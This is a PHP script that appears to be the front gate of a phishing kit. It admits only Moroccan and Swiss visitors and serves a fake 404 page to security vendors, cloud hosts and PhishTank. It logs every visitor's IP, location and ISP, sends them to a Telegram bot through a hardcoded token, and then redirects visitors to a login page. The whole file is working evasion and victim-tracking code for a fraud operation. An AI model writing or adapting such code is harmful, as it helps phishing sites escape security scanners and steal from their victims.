<?php
session_start();
$allowed_countries = array('MA', 'CH');
$blocked_strings = array(
'Aveniq Avectris AG','Level 7 Wireless', 'Apple Inc', 'Latitude.sh', 'M247', 'Amazone', 'DigitalOcean', 'Amazon', 'Google', 'phishtank', 'net4sec', 'AVAST Software s.r.o.', 'BullGuard ApS', 'PayPal', 'Hotmail', 'Yahoo', 'AOL', 'Microsoft', 'Kaspersky Lab', 'Linode', 'MSN', 'Online S.A.S.', 'Joshua Peter McQuistan', 'OVH SAS', 'avira', 'Forcepoint', 'Cloud', 'Forcepoint Cloud Ltd', 'Google', 'Facebook', 'HostRoyale', 'Green Floid LLC', 'The Constant Company', 'ONLINE S.A.S', 'H4Y Technologies', 'Datacamp Limited', 'Digital Network', 'Intelligence Network Online', 'Geekyworks IT Solutions', 'The Calyx Institute', 'Perimeter', 'TerraTransit', 'Hurricane Electric', 'Uninet S.A.', 'AVAST', 'Microsense', 'PALO ALTO NETWORKS', 'ServeByte', 'Fastly', 'Google LLC', 'Overplay', 'Netprotect', 'Strong Technology', 'Web2Objects', 'tzulo', 'NETPROTECT', 'GleSYS', 'Cloudflare', 'Cloudflare, Inc.', 'Axera SpA', 'Axera S.P.A.', 'DedFiberCo', 'VISPERAD NETWORKS', 'EGIHosting', 'NAVER Cloud', 'Dreamx', 'DIMENOC SERVICOS DE INFORMATICA', 'HostDime', 'Powerhouse', 'Powerhouse Management', 'Unus, Inc.', 'Cisco', 'Cisco OpenDNS LLC', 'Twitter', 'Hetzner', 'Telegram', 'TEFINCOM', 'Tefincom', 'Packethub', 'AWS EC2', 'Forcepoint Cloud', 'Forcepoint', 'Paradise Networks', 'CenturyLink Communications', 'NEXT GLOBAL SERVICES', 'Next Global Services', 'UAB code200', 'Ovh', 'ovh', 'Liteserver', 'Leaseweb', 'Space Exploration Technologies', 'SpaceX Services', 'SpaceX Services, Inc', 'UNINET', 'Jisc Services', 'University of Bath', 'Bath University', 'Synergy Wholesale PTY LTD', 'SYNERGY WHOLESALE PTY LTD', 'IPXO UK LIMITED', 'Ipxo UK Limited', 'QuickPacket', 'BraveWay', 'Geekyworks', 'NETROTECT-BOM', 'myLoc', 'Microplex', 'SCALEWAY', 'Datacamp', 'INCX Global', 'Windscribe', 'Blix Solutions', 'Blix', 'Universal Layer', 'Vultr', 'Datacenter', 'Server', 'server', 'Hosting', 'hosting', 'External Content Distribution Network', 'Rural Telephone Service Company', 'American Registry Internet Numbers', 'Internet Numbers', 'Hi3G Access AB', 'Hi3gaccess', 'Digital Network JSC', 'Digital Network', 'Level 3 Communications', 'Level3', 'Webline Services', 'WhiteLabelColo', 'WhiteSky Communications', 'WhiteSky', 'WhiteSky', 'QuickPacket', 'BraveWay', 'Colocation America Corporation', 'Segna Technologies', 'Digital Ocean', 'Google Cloud', 'Strong Technology', 'Emerald Onion', 'Shock Hosting', 'AxcelX', 'W I X NET DO BRASIL LTDA', 'Qnax Ltda', 'Orange', 'orange', 'Telepoint Ltd', 'Akamai Technologies', 'Proofpoint', 'SEWAN', 'SEWAN SAS', 'ORG-SCS33-RIPE', 'Unus, Inc.', 'AltusHost', 'Iseek Communications', 'Iseek', 'Euskaltel', 'GTT Communications', 'ANTISPAMEUROPE', 'ANTISPAM', 'MK Netzdienste GmbH', 'OVPN Integritet', 'OVPN', '31173 Services AB', 'Hostway', 'Verlag Heinz Heise GmbH', 'Deutscher Wetterdienst', 'Keyweb', 'Chang Way', 'Starcrecium', 'The Calyx', 'Calyx', 'FORTINET', 'FORTINET TECHNOLOGIES', 'Fortinet', 'fortinet', 'Fortinet Inc', 'Oculus Networks', 'Oculus', 'Shadow Server', 'Hurricane', 'Ovpn', 'ovpn', 'NForce', 'Globalhost', 'Web Hosting', 'Rootnerds', 'Amanah Tech', 'O2 Online', 'INCX', 'INCX', 'ThoughtPort', 'Halo Colocation', 'Halo Colocation LLC', 'ThoughtPort Networking', 'GetNet', 'SERVERFIELD', 'Cdnext', 'Ipxo', 'Quintex', 'FranTech', 'myLoc managed', 'FranTech Solutions', 'ITN Ssl1 OL', 'Universitaet Stuttgart', 'Core-Backbone', 'Webinvest International SA', 'Hornetsecurity', 'security', 'Security', 'EstNOC OY', 'ESTNOC-GLOBAL', 'Cogent', 'Cogent Communications', 'cogent', 'Amazon Technologies Inc.', 'Amazon', 'AWS EC2 (eu-west-2)', 'AWS', 'Aws', 'aws', 'PlusNet plc', 'PlusNet', 'plusnet', 'TalkTalk', 'Level 3 Communications', 'Dedicated Servers', 'Keliweb', 'Strong Technology', 'GleSYS', 'Hivelocity', 'LeaseWeb', 'Red IP Multi Acceso', 'Red de servicios IP', 'Lite Info LLC', '31173 Services', 'ExcellMedia', 'Excell Media', 'First Dinahosting', 'DinaHosting', 'Bla001', 'SONDATECH', 'Sondatech', 'FORTINET', 'DH-J2', 'Apogee Telecom', 'WiscNet', ' OLIVE ', 'Olive', 'Lite Info', 'Administracion', 'Administration' 
);


function getIpInfo($ip = '')
{
    $ipinfo = file_get_contents("http://ip-api.com/json/" . $ip . "");
    $ipinfo_json = json_decode($ipinfo, true);
    return $ipinfo_json;
}

function containsBlockedString($ipinfo_json, $blocked_strings)
{
    foreach ($blocked_strings as $blocked_string) {
        if (stripos(json_encode($ipinfo_json), $blocked_string) !== false) {
            return true;
        }
    }
    return false;
}

$visitor_ip = $_SERVER['REMOTE_ADDR'];
$ipinfo_json = getIpInfo($visitor_ip);
$country_code = "{$ipinfo_json['countryCode']}";

if (!in_array($country_code, $allowed_countries) || containsBlockedString($ipinfo_json, $blocked_strings)) {
    $blocked_ip_file = fopen("botdl5ra.txt", "a");
    $blocked_ip_info = $visitor_ip . " - ISP: " . $ipinfo_json['isp'] . " - ORG: " . $ipinfo_json['org'] . " - " . gmdate("Y-n-d") . " @ " . gmdate("H:i:s") . "\n";
    fwrite($blocked_ip_file, $blocked_ip_info);
    fclose($blocked_ip_file);

    header("HTTP/1.1 404 Not Found");
    header("Status: 404 Not Found");
    echo '
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.2.15 (CentOS) Server at srv190630.hoster-test.ru Port 80</address>
</body></html>';
    exit();
}

$ip = getenv("REMOTE_ADDR");

$file = fopen("v.txt", "a");
fwrite($file, $ip . "  -  " . gmdate("Y-n-d") . " @ " . gmdate("H:i:s") . "\n");
fclose($file);

$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/" . $ip));
$COUNTRY = $IP_LOOKUP->country . "\r\n";
$CITY = $IP_LOOKUP->city . "\r\n";
$REGION = $IP_LOOKUP->region . "\r\n";
$STATE = $IP_LOOKUP->regionName . "\r\n";
$ZIPCODE = $IP_LOOKUP->zip . "\r\n";
$ISP = $IP_LOOKUP->isp . "\r\n"; // Get the ISP information

$msg = $ip . "\nCountry: " . $COUNTRY . "City: " . $CITY . "Region: " . $REGION . "State: " . $STATE . "Zip: " . $ZIPCODE . "ISP: " . $ISP; // Include ISP in the message

function sendMessage($token, $chat_id, $message)
{
    $data = [
        'text' => $message,
        'chat_id' => $chat_id
    ];

    $url = "https://api.telegram.org/bot$token/sendMessage";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        // Error: Do not display the error message
    } else {
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if ($http_code != 200) {
            // Error: Do not display the HTTP Status Code or response
        } else {
            // Message sent successfully, do nothing
        }
    }

    curl_close($ch);
}

$ip = getenv("REMOTE_ADDR");
$message = "[Alert] NEW VISITOR FROM IP: $ip\nISP: $ISP"; // Include ISP in the message
$token = '5759111738:AAHsW7K_NhXMJOk89TYWrwooJYYCsu8k1Xo';
$chat_id = '-995416692';

sendMessage($token, $chat_id, $message);



header("Location: login.php");?>
